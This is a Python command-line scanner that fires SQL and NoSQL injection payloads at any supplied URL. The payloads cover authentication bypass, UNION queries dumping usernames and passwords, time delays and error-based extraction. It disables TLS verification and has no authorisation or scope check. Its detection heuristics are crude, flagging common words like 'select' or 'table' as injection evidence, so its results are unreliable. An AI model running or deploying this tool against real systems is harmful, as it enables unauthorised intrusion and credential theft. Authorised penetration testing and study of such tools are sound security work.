#!/usr/bin/env python3
"""
SQL Injection Testing Tool
Tests for various SQL injection vulnerabilities using multiple techniques
"""

import sys
import json
import time
import urllib.parse
import urllib.request
import ssl
from urllib.error import URLError
import re

class SQLInjectionTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = self._create_session()
        self.vulnerabilities = []
        self.test_results = []

        # SQL Injection payloads based on Apex's ATTACK_KNOWLEDGE
        self.payloads = {
            'boolean_blind': [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "admin' OR '1'='1",
                "' OR 'x'='x",
                "') OR ('1'='1",
                "\" OR \"1\"=\"1",
                "1' OR '1'='1' #"
            ],
            'union_based': [
                "' UNION SELECT 1--",
                "' UNION SELECT username,password FROM users--",
                "' UNION SELECT null,username,password FROM users--",
                "1' UNION SELECT 1,2,3--",
                "' UNION SELECT 1,column_name FROM information_schema.columns--",
                "1' UNION SELECT schema_name,TABLE_NAME FROM information_schema.tables--"
            ],
            'time_based': [
                "'; WAITFOR DELAY '00:00:05'--",
                "'; SELECT SLEEP(5)--",
                "'; SELECT pg_sleep(5)--",
                "' AND SLEEP(5)--",
                "1' AND SLEEP(5)--",
                "'; SELECT BENCHMARK(5000000,MD5('test'))--"
            ],
            'error_based': [
                "'",
                "\"",
                "\\",
                "' AND 1=CONVERT(int, (SELECT @@version)) --",
                "' AND 1=CAST((SELECT @@version) AS int) --",
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
            ],
            'nosql_mongodb': [
                {"username": {"$ne": ""}, "password": {"$ne": ""}},
                {"username": "admin", "password": {"$ne": "wrong"}},
                {"$where": "this.username == 'admin' || 1==1"},
                {"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
            ]
        }

    def _create_session(self):
        """Create a simple session-like object"""
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return {'context': ctx}

    def _make_request(self, url, data=None, method='GET'):
        """Make HTTP request and measure response time"""
        start_time = time.time()

        try:
            if method == 'POST' and data:
                encoded_data = urllib.parse.urlencode(data).encode()
                req = urllib.request.Request(url, data=encoded_data, method=method)
            else:
                req = urllib.request.Request(url, method=method)

            req.add_header('User-Agent', 'Mozilla/5.0 (compatible; Pentest-Toolkit/1.0)')
            req.add_header('Accept', 'text/html,application/json,*/*')

            with urllib.request.urlopen(req, context=self.session['context'], timeout=30) as response:
                response_time = time.time() - start_time
                content = response.read().decode('utf-8', errors='ignore')

                return {
                    'status': response.status,
                    'headers': dict(response.headers),
                    'content': content,
                    'response_time': response_time
                }
        except Exception as e:
            return {
                'error': str(e),
                'response_time': time.time() - start_time
            }

    def _analyze_response(self, response, payload, test_type):
        """Analyze response for SQL injection indicators"""
        if 'error' in response:
            return False, "Request failed"

        content = response.get('content', '').lower()
        status = response.get('status')
        response_time = response.get('response_time', 0)

        # SQL error patterns (from Apex's indicators)
        sql_errors = [
            'sql syntax', 'mysql_fetch', 'mysql_num_rows', 'ora-', 'microsoft ole db',
            'odbc drivers error', 'warning: mysql', 'valid mysql result', 'mysqlclient',
            'postgresql query failed', 'pg_query', 'pg_exec', 'psql', 'plpgsql',
            'warning: pg_', 'valid postgresql result', 'postgresql error',
            'warning: mssql_', 'microsoft ole db provider for odbc drivers error',
            'unclosed quotation mark', 'unclosed character string',
            'column', 'table', 'where', 'select', 'insert', 'update', 'delete',
            'union', 'join', 'database', 'schema', 'information_schema'
        ]

        # Check for SQL errors in response
        if any(error in content for error in sql_errors):
            return True, f"SQL error detected: {test_type}"

        # Check for time-based injection
        if test_type == 'time_based' and response_time > 4:
            return True, f"Time delay detected: {response_time:.2f}s"

        # Check for successful boolean-based injection
        if test_type == 'boolean_blind':
            # Compare with baseline response
            if status != 401 and 'unauthorized' not in content:
                return True, "Possible authentication bypass"

        # Check for union-based injection
        if test_type == 'union_based':
            if 'column' in content or 'table' in content or 'database' in content:
                return True, "Union injection successful"

        return False, None

    def test_parameter(self, url, param_name, param_value):
        """Test a specific parameter for SQL injection"""
        print(f"\n[*] Testing parameter: {param_name}")

        # Parse URL to extract parameters
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)

        for category, payloads in self.payloads.items():
            if category == 'nosql_mongodb':
                continue  # Skip NoSQL for now, needs JSON handling

            print(f"  [*] Testing {category.replace('_', ' ')}...")

            for payload in payloads:
                # Prepare test URL
                test_params = query_params.copy()
                test_params[param_name] = [payload]

                test_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"

                # Make request
                response = self._make_request(test_url)

                # Analyze response
                is_vulnerable, reason = self._analyze_response(response, payload, category)

                if is_vulnerable:
                    vulnerability = {
                        'type': 'SQL Injection',
                        'category': category,
                        'parameter': param_name,
                        'url': test_url,
                        'payload': payload,
                        'reason': reason,
                        'severity': 'CRITICAL' if 'union' in category or 'time' in category else 'HIGH'
                    }
                    self.vulnerabilities.append(vulnerability)
                    print(f"    [!] VULNERABLE: {reason}")
                    print(f"        Payload: {payload}")
                else:
                    print(f"    [-] Safe: {payload[:50]}...")

                # Test POST method as well
                post_data = {param_name: payload}
                post_response = self._make_request(url, post_data, 'POST')

                is_vulnerable_post, reason_post = self._analyze_response(post_response, payload, category)

                if is_vulnerable_post:
                    vulnerability = {
                        'type': 'SQL Injection (POST)',
                        'category': category,
                        'parameter': param_name,
                        'url': url,
                        'payload': payload,
                        'method': 'POST',
                        'reason': reason_post,
                        'severity': 'CRITICAL'
                    }
                    self.vulnerabilities.append(vulnerability)
                    print(f"    [!] VULNERABLE (POST): {reason_post}")

                # Small delay to avoid overwhelming the server
                time.sleep(0.5)

    def test_json_endpoints(self, url):
        """Test JSON endpoints for NoSQL injection"""
        print(f"\n[*] Testing for NoSQL injection (JSON)...")

        # JSON payloads for NoSQL injection
        nosql_payloads = [
            {"username": {"$ne": ""}, "password": {"$ne": ""}},
            {"username": "admin", "password": {"$gt": ""}},
            {"username": {"$regex": "admin"}, "password": {"$ne": ""}},
            {"$where": "return true"}
        ]

        for payload in nosql_payloads:
            try:
                data = json.dumps(payload).encode('utf-8')
                req = urllib.request.Request(url, data=data, method='POST')
                req.add_header('Content-Type', 'application/json')
                req.add_header('User-Agent', 'Mozilla/5.0 (compatible; Pentest-Toolkit/1.0)')

                with urllib.request.urlopen(req, context=self.session['context'], timeout=10) as response:
                    if response.status == 200:
                        content = response.read().decode()
                        # Check if login succeeded or data returned
                        if 'success' in content.lower() or 'token' in content.lower():
                            vulnerability = {
                                'type': 'NoSQL Injection',
                                'url': url,
                                'payload': json.dumps(payload),
                                'severity': 'CRITICAL'
                            }
                            self.vulnerabilities.append(vulnerability)
                            print(f"    [!] NoSQL injection possible with: {payload}")

            except Exception as e:
                pass  # Expected for non-JSON endpoints

    def discover_parameters(self, url):
        """Discover parameters in the URL"""
        parsed = urllib.parse.urlparse(url)
        return list(urllib.parse.parse_qs(parsed.query).keys())

    def run_sql_injection_test(self):
        """Run comprehensive SQL injection test"""
        print(f"[*] Starting SQL injection test for: {self.target_url}")
        print("=" * 60)

        # Discover parameters
        parameters = self.discover_parameters(self.target_url)

        if not parameters:
            print("[-] No parameters found in URL. Testing common parameter names...")
            parameters = ['id', 'user', 'username', 'email', 'password', 'search', 'query', 'q']

        print(f"[*] Found parameters to test: {parameters}")

        # Test each parameter
        for param in parameters:
            self.test_parameter(self.target_url, param, 'test')

        # Test for JSON/NoSQL injection
        self.test_json_endpoints(self.target_url)

        # Print results
        print("\n" + "=" * 60)
        print(f"[*] SQL Injection Test Complete")
        print(f"[*] Vulnerabilities found: {len(self.vulnerabilities)}")

        if self.vulnerabilities:
            print("\n[VULNERABILITIES]")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"\n{i}. {vuln['type']}")
                print(f"   Severity: {vuln['severity']}")
                print(f"   Parameter: {vuln.get('parameter', 'N/A')}")
                print(f"   Payload: {vuln['payload']}")
                print(f"   Reason: {vuln['reason']}")
                if vuln.get('method'):
                    print(f"   Method: {vuln['method']}")
        else:
            print("\n[+] No SQL injection vulnerabilities detected")

        # Save results
        results = {
            'target': self.target_url,
            'test_type': 'SQL Injection',
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'parameters_tested': parameters,
            'vulnerabilities': self.vulnerabilities,
            'vulnerability_count': len(self.vulnerabilities)
        }

        output_file = 'sql_injection_results.json'
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2)

        print(f"\n[+] Results saved to: {output_file}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 test_sql_injection.py <target_url>")
        print("Example: python3 test_sql_injection.py https://example.com/login?user=test")
        sys.exit(1)

    target_url = sys.argv[1]

    # Validate URL format
    if not (target_url.startswith('http://') or target_url.startswith('https://')):
        target_url = 'https://' + target_url

    tester = SQLInjectionTester(target_url)

    try:
        tester.run_sql_injection_test()
    except KeyboardInterrupt:
        print("\n[!] Test interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()